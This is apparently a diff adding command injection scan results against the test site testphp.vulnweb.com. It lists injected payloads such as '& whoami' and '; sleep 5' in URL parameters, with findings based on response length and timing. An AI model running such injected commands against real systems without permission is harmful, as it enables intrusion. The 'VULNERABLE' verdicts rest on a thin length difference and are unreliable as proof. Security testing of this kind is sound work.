@@ -1,0 +1,38 @@
+Command Injection Vulnerability Scan Results
+=======================================
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Parameter: cat
+Payload: & whoami
+Status: Potential Command Injection Vulnerability
+Analysis: VULNERABLE: Significant difference in response length (2147 vs 2036)
+-----------------------------
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=2
+Parameter: cat
+Payload: & whoami
+Status: Potential Command Injection Vulnerability
+Analysis: VULNERABLE: Significant difference in response length (2147 vs 2036)
+-----------------------------
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=3
+Parameter: cat
+Payload: & whoami
+Status: Potential Command Injection Vulnerability
+Analysis: VULNERABLE: Significant difference in response length (2147 vs 2036)
+-----------------------------
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=4
+Parameter: cat
+Payload: & whoami
+Status: Potential Command Injection Vulnerability
+Analysis: VULNERABLE: Significant difference in response length (2147 vs 2036)
+-----------------------------
+
+URL: http://testphp.vulnweb.com?pp=12
+Parameter: pp
+Payload: ; sleep 5
+Status: Potential Time-based Command Injection
+Analysis: Response time: 5.94 seconds
+-----------------------------
+
